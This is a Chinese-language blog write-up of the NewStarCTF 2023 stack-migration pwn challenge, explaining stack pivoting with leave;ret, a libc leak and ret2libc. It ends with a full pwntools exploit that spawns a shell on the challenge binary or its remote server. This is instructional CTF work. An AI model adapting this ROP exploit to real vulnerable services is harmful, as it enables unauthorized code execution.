@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[NewStarCTF] 2023 stack migration write up | Blog de NazrinDuck</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="这几天做的自我感觉很有代表性的一个题，尝试写一下wp，不能保证没有错误，欢迎大家指出 本题属于比较麻烦的一类栈迁移， 不但有经典的溢出限制，而且还结合了ret2libc的内容（没有后门），需要先泄露找libc再写入system和binsh。思路不难但实现复杂，属于是很典型的ROP了。 先checksec一下:  64位程序只开了一个NX堆栈不可执行，无特殊，接着进ida64； 审视一下函数表和字符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[NewStarCTF] 2023 stack migration write up">
+<meta property="og:url" content="http://example.com/2024/02/17/writeup1/index.html">
+<meta property="og:site_name" content="Blog de NazrinDuck">
+<meta property="og:description" content="这几天做的自我感觉很有代表性的一个题，尝试写一下wp，不能保证没有错误，欢迎大家指出 本题属于比较麻烦的一类栈迁移， 不但有经典的溢出限制，而且还结合了ret2libc的内容（没有后门），需要先泄露找libc再写入system和binsh。思路不难但实现复杂，属于是很典型的ROP了。 先checksec一下:  64位程序只开了一个NX堆栈不可执行，无特殊，接着进ida64； 审视一下函数表和字符">
+<meta property="og:locale">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-ce6779c6f175f4e204a62d4cca4c21e7_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-dd343ba035edc70a715596a7188d9368_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-03dc93bccced021dd9ba6674f3764b51_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-9481fe7bfdbcdae1bfd85c7cfbf05811_1440w.webp">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-70388e21fc537709db5b49ac5941f9a7_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-d64ce685dd2357fccbeed6c097b8ee48_1440w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-4d45973a2bf826df4a6820a71ae03de1_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-a9e2c79da17ded55849709e46c344414_1440w.webp">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-a5abec0913190a0eee6b5291ff4a5f7b_1440w.webp">
+<meta property="article:published_time" content="2024-02-16T16:00:03.000Z">
+<meta property="article:modified_time" content="2024-09-18T16:37:49.210Z">
+<meta property="article:author" content="NazrinDuck">
+<meta property="article:tag" content="history">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic4.zhimg.com/80/v2-ce6779c6f175f4e204a62d4cca4c21e7_1440w.webp">
+  
+    <link rel="alternate" href="/atom.xml" title="Blog de NazrinDuck" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Blog de NazrinDuck</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">上不去下不来，卡在这了</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Buscar"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Buscar"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-writeup1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/17/writeup1/" class="article-date">
+  <time class="dt-published" datetime="2024-02-16T16:00:03.000Z" itemprop="datePublished">2024-02-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      [NewStarCTF] 2023 stack migration write up
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这几天做的自我感觉很有代表性的一个题，尝试写一下wp，不能保证没有错误，欢迎大家指出</p>
+<p>本题属于比较麻烦的一类栈迁移， 不但有经典的溢出限制，而且还结合了ret2libc的内容（没有后门），需要先泄露找libc再写入system和binsh。思路不难但实现复杂，属于是很典型的ROP了。</p>
+<p>先checksec一下:</p>
+<p><img src="https://pic4.zhimg.com/80/v2-ce6779c6f175f4e204a62d4cca4c21e7_1440w.webp"></p>
+<p>64位程序只开了一个NX堆栈不可执行，无特殊，接着进ida64；</p>
+<p>审视一下函数表和字符串表（shift+F12），发现无后门，无system函数或binsh，能感觉到解法绕不开ret2libc了。</p>
+<p>进main函数，里头有俩段：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-dd343ba035edc70a715596a7188d9368_1440w.webp"></p>
+<p>第一段0x401196属于初始化，不管，直接进第二段0x4011FB</p>
+<p><img src="https://pic2.zhimg.com/80/v2-03dc93bccced021dd9ba6674f3764b51_1440w.webp"></p>
+<p>一看有俩read，仔细看事实上只有第二个有溢出风险，而且0x60&#x3D;96，只有16个字节的溢出空间，正好只够填充64位程序8字节的ebp和ret地址，要想实现ret2libc必须将payload迁移至v2中去，这就需要栈迁移。</p>
+<p>栈迁移本质是利用leave指令来篡改ebp地址来控制栈顶esp，进而控制ret的地址来完成迁移操作。</p>
+<p>（这里解释一下：leave &#x3D; mov esp ebp;pop ebp，ret &#x3D; pop eip;利用前者我们可以把ebp换成想要的地址传给esp，这样下一次ret就会在我们想要的地址处取地址执行指令，从而达到控制程序流的目的</p>
+<p><img src="https://pic2.zhimg.com/80/v2-9481fe7bfdbcdae1bfd85c7cfbf05811_1440w.webp"></p>
+<p>为此我们首先要拿到leave&amp;ret的gadget，ROPgadget一下</p>
+<p>顺便把之后需要的ret，rdi也爆一下</p>
+<p><img src="https://pic4.zhimg.com/80/v2-70388e21fc537709db5b49ac5941f9a7_1440w.webp"></p>
+<p>其次我们要知道栈地址，注意到函数里头这个printf：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-d64ce685dd2357fccbeed6c097b8ee48_1440w.webp"></p>
+<p>可以看出出题人好心帮了我们一把，直接把buf的地址爆了，相当于直接获得了栈地址，栈迁移的条件齐全了</p>
+<p>不放心的话可以Linux下gdb一下子，这里就不试了</p>
+<p>这样前置工作差不多结束了，接下来开始写payload：</p>
+<p>第一个buf随便写就行（反正最后会被pop掉），首先接收传来的地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;m&#x27;</span>)[:-<span class="number">1</span>].rjust(<span class="number">16</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">log.success(addr)</span><br><span class="line">bufAddr = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(bufAddr))</span><br></pre></td></tr></table></figure>
+
+<p>这个地方根据回显来处理地址的字符串切片就行，不一定非得写一样的。byte转int直接用就行。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-4d45973a2bf826df4a6820a71ae03de1_1440w.webp"></p>
+<p>下一个read开始栈迁移+爆地址，这里选择爆read的（这个随便看心情，如果pwn不动可以换一个函数试试）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(retAddr)</span><br><span class="line">payload += p64(rdiAddr) + p64(readGot) + p64(putsPlt) + p64(mainAddr)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bufAddr)</span><br><span class="line">payload += p64(levretAddr)</span><br></pre></td></tr></table></figure>
+
+<p>这里的ret目的是栈对齐，pwn不通的话加个ret试试；bufAddr就是buf的地址，和接下来的v2是连着的，8字节正好pop掉，不影响后边的payload。为了再返回打第二波，把main地址加后边</p>
+<p>成功爆出了read的内存地址：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-a9e2c79da17ded55849709e46c344414_1440w.webp"></p>
+<p>接收一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readAddr = u64(p.recv(<span class="number">8</span>)[:-<span class="number">2</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>地址切片处理还是依照回显调整</p>
+<p>题目附件有libc，直接用现成的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libcElf = ELF(<span class="string">&#x27;../libc.so.6&#x27;</span>)</span><br><span class="line">system_libc = libcElf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_libc = libcElf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">puts_libc = libcElf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_libc = libcElf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>算一下偏移量：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset = readAddr - read_libc</span><br><span class="line">binsh = offset + binsh_libc</span><br><span class="line">system = offset + system_libc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>验证libc版本是否匹配：看一下offset后三位<br>若是000大概率正确，实在不行用DynElf</p>
+</blockquote>
+<p>接下来是第二波：（注意地址换了，需要再接收一下）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(retAddr)</span><br><span class="line">payload += p64(retAddr)</span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line"><span class="comment">#payload += p64(binsh)</span></span><br><span class="line">payload += p64(bufAddr + <span class="number">56</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bufAddr)</span><br><span class="line">payload += p64(levretAddr)</span><br></pre></td></tr></table></figure>
+
+<p>这一波就直接开始pwn了。（其实这里的binsh直接用就行，这种偏移写法麻烦容易犯错，只是测试一下有没有算错地址）注意补ret来栈对齐。</p>
+<p>成功拿到flag：</p>
+<p><img src="https://pic4.zhimg.com/80/v2-a5abec0913190a0eee6b5291ff4a5f7b_1440w.webp"></p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&#x27;../sm&#x27;</span></span><br><span class="line">elf =ELF(binary)</span><br><span class="line">libcElf = ELF(<span class="string">&#x27;../libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">port = <span class="number">25251</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = <span class="string">b&quot;ls &amp;&amp; cat flag&quot;</span></span><br><span class="line"><span class="comment">#===============   libc  ===============#</span></span><br><span class="line">system_libc = libcElf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_libc = libcElf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">puts_libc = libcElf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_libc = libcElf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============plt &amp; got===============#</span></span><br><span class="line">putsPlt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">putsGot = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">readGot = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#==================rop==================#</span></span><br><span class="line">mainAddr = <span class="number">0x4011fb</span></span><br><span class="line">retAddr = <span class="number">0x000000000040101a</span></span><br><span class="line">levretAddr = <span class="number">0x00000000004012aa</span></span><br><span class="line">rdiAddr = <span class="number">0x0000000000401333</span></span><br><span class="line"><span class="comment">#pop rdi;ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=================start=================#</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;m&#x27;</span>)[:-<span class="number">1</span>].rjust(<span class="number">16</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">log.success(addr)</span><br><span class="line">bufAddr = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(bufAddr))</span><br><span class="line"></span><br><span class="line">payload = p64(retAddr)</span><br><span class="line">payload += p64(rdiAddr) + p64(readGot) + p64(putsPlt) + p64(mainAddr)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bufAddr)</span><br><span class="line">payload += p64(levretAddr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;plz:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">readAddr = u64(p.recv(<span class="number">8</span>)[:-<span class="number">2</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">offset = readAddr - read_libc</span><br><span class="line">binsh = offset + binsh_libc</span><br><span class="line">system = offset + system_libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#================round 2================#</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;m&#x27;</span>)[:-<span class="number">1</span>].rjust(<span class="number">16</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">log.success(addr)</span><br><span class="line">bufAddr = <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(bufAddr))</span><br><span class="line"></span><br><span class="line">payload = p64(retAddr)</span><br><span class="line">payload += p64(retAddr)</span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line"><span class="comment">#payload += p64(binsh)</span></span><br><span class="line">payload += p64(bufAddr + <span class="number">56</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bufAddr)</span><br><span class="line">payload += p64(levretAddr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;plz:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#=================End=================#</span></span><br><span class="line">p.sendline(<span class="built_in">next</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/17/writeup1/" data-id="cm182gwyl0002g7tjc2hc16jo" data-title="[NewStarCTF] 2023 stack migration write up" class="article-share-link"><span class="fa fa-share">Compartir</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/history/" rel="tag">history</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/02/19/writeup2/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Nuevo</strong>
+      <div class="article-nav-title">
+        
+          [ctfshow pwn 内部赛] 签到题 write up
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/history/" rel="tag">history</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/syscall/" rel="tag">syscall</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nube de Tags</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/history/" style="font-size: 20px;">history</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/stack/" style="font-size: 13.33px;">stack</a> <a href="/tags/syscall/" style="font-size: 10px;">syscall</a> <a href="/tags/web/" style="font-size: 10px;">web</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archivos</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Posts recientes</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/02/23/writeup4/"> [CTF pwn] ciscn_s_3 write up</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/21/IIS/">[CTF web] 通过IIS在Windows下搭建php环境</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/21/writeup3/">[ctfshow] pwn 内部赛 flower write up</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/19/writeup2/">[ctfshow pwn 内部赛] 签到题 write up</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/17/writeup1/">[NewStarCTF] 2023 stack migration write up</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 NazrinDuck<br>
+      Construido por <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
